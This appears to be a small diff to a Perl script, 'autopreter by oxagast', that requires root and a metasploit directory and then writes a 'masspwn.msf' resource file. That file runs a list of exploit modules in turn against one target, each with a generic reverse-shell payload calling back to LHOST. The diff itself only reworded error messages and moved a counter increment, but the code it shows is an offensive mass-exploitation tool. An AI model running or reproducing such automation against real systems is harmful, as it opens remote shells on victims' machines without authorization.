@@ -3,7 +3,7 @@ use strict;
 use Cwd qw();
 my $path = Cwd::cwd();
 if ($path !~ m/metasploit/) {
-  print ("Your current working directory must be metasploit's.\n");
+  print ("err: Your current working directory must be metasploit's.\n");
   exit(1);
 }
 print("autopreter by oxagast\n");
@@ -16,7 +16,7 @@ if($#ARGV < 1) {
   exit(1);
 }
 if(`id` !~ m/root/) {
-  print("Must be run as root on the local machine.\n");
+  print("err: Must be run as root on the local machine.\n");
   exit(1);
 }
 my $lhost = $ARGV[1];
@@ -64,7 +64,6 @@ my $handler = 2000;;
 my $fh;
 open($fh, ">", "masspwn.msf");
 foreach(@umods) {
-  $handler++;
   print($fh "use $_\n");
   print($fh "set RHOST $rhost\n");
   print($fh "set LHOST $lhost\n");
@@ -72,6 +71,7 @@ foreach(@umods) {
   print($fh "set ExitOnSession false\n");
   print($fh "set PAYLOAD generic_shell_reverse\n");
   print($fh "exploit -j -z\n");
+  $handler++;
 }
 print($fh "jobs -K\n");
 print($fh "sessions\n");
